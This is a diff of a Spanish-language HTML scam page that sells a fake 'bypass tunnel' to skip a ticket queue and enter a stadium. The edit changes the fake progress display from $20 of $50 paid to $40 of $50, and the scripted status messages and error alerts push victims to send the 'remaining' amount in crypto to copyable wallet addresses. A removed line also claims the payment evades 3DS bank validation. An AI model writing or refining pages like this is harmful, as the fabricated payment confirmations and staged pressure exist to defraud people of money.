@@ -15,9 +15,8 @@
         .address-box { background: #f0f2f5; border: 1px solid #ddd; padding: 12px; border-radius: 8px; font-family: monospace; font-size: 11px; word-break: break-all; margin-top: 5px; color: #111b33; position: relative; cursor: pointer; }
         .copy-tag { position: absolute; right: 8px; top: 12px; font-size: 9px; color: #3b50b6; font-weight: bold; border: 1px solid #3b50b6; padding: 2px 4px; border-radius: 4px; background: white; }
         
-        /* New Payment Tracker Styles */
-        .payment-status { background: #fff8e1; border: 1px solid #ffe082; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
-        .status-dot { height: 10px; width: 10px; background-color: #ffb300; border-radius: 50%; display: inline-block; margin-right: 5px; animation: pulse 1.5s infinite; }
+        .payment-status { background: #e8f5e9; border: 1px solid #a5d6a7; padding: 15px; border-radius: 12px; margin-bottom: 20px; }
+        .status-dot { height: 10px; width: 10px; background-color: #2e7d32; border-radius: 50%; display: inline-block; margin-right: 5px; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
     </style>
 </head>
@@ -65,16 +64,16 @@
             
             <div class="payment-status">
                 <div class="flex justify-between items-center mb-2">
-                    <span class="text-[10px] font-bold text-amber-700 uppercase"><span class="status-dot"></span> Pago Parcial Detectado</span>
-                    <span class="text-[10px] font-black text-amber-800 tracking-tighter">$20.00 / $50.00</span>
+                    <span class="text-[10px] font-bold text-green-700 uppercase"><span class="status-dot"></span> Transacción de $30 Confirmada</span>
+                    <span class="text-[10px] font-black text-green-800 tracking-tighter">$40.00 / $50.00</span>
                 </div>
-                <div class="w-full bg-amber-200 h-2 rounded-full mb-2">
-                    <div class="bg-amber-600 h-full rounded-full" style="width: 40%"></div>
+                <div class="w-full bg-green-200 h-2 rounded-full mb-2">
+                    <div class="bg-green-600 h-full rounded-full transition-all duration-1000" style="width: 80%"></div>
                 </div>
-                <p class="text-[11px] text-amber-900 font-bold leading-tight">Acceso bloqueado: Deposite los <span class="underline">$30.00 restantes</span> para completar la validación del túnel prioritario.</p>
+                <p class="text-[11px] text-green-900 font-bold leading-tight italic">Balance casi completo. Deposite los <span class="underline text-red-600">$10.00 finales</span> para liberar el túnel de bypass inmediatamente.</p>
             </div>
 
-            <p class="text-xs text-gray-500 mb-6 leading-tight">Complete el depósito de seguridad balanceado. **Este pago evita la validación 3DS bancaria y activa el bypass.**</p>
+            <p class="text-xs text-gray-500 mb-6 leading-tight">Su sesión está en espera. Una vez recibidos los $10 restantes, el sistema habilitará el botón de acceso al estadio.</p>
             
             <div class="space-y-4">
                 <div>
@@ -108,18 +107,10 @@
                         <span class="copy-tag">COPY</span>
                     </div>
                 </div>
-
-                <div>
-                    <label class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">USD Coin (USDC - ERC20)</label>
-                    <div class="address-box" onclick="copyText('0x04065cCfbbcccaD53102B98ADE0e0644E088367C')">
-                        0x04065cCfbbcccaD53102B98ADE0e0644E088367C
-                        <span class="copy-tag">COPY</span>
-                    </div>
-                </div>
             </div>
 
-            <button onclick="finalRedirect()" class="mt-8 w-full py-4 bg-gray-400 text-white rounded-xl font-bold uppercase text-xs tracking-[0.2em] cursor-not-allowed">
-                ESPERANDO BALANCE ($30.00)...
+            <button onclick="finalRedirect()" class="mt-8 w-full py-4 bg-orange-400 text-white rounded-xl font-bold uppercase text-xs tracking-[0.2em] cursor-not-allowed">
+                ESPERANDO BALANCE FINAL ($10.00)...
             </button>
         </div>
     </div>
@@ -139,13 +130,13 @@
         const mainBtn = document.getElementById('main-btn');
 
         setTimeout(() => {
-            progressBar.style.width = "70%";
-            statusText.innerText = "Token de sesión detectado. Saltando Queue-it...";
+            progressBar.style.width = "85%";
+            statusText.innerText = "Transacción parcial reconocida. Sincronizando...";
             setTimeout(() => {
                 progressBar.style.width = "100%";
-                statusText.innerHTML = "¡CONEXIÓN SEGURA! <span class='text-green-400 font-bold underline'>Bypass Activado</span>";
+                statusText.innerHTML = "¡BYPASS EN ESPERA! <span class='text-orange-400 font-bold underline'>Faltan $10.00</span>";
                 mainBtn.classList.remove('opacity-50', 'cursor-not-allowed');
-                mainBtn.innerText = "COMPLETAR ACTIVACIÓN ($30.00)";
+                mainBtn.innerText = "VERIFICAR BALANCE ($10.00 PENDIENTE)";
             }, 1500);
         }, 1000);
 
@@ -154,7 +145,7 @@
         }
 
         function finalRedirect() {
-            alert("Error: El balance de $30.00 no ha sido confirmado en la red. Por favor, complete el depósito para liberar el acceso.");
+            alert("Error de Red: Se han detectado $40.00. El túnel de bypass requiere el balance total de $50.00 para generar el token de entrada. Por favor, envíe los $10.00 restantes.");
         }
     </script>
 </body>
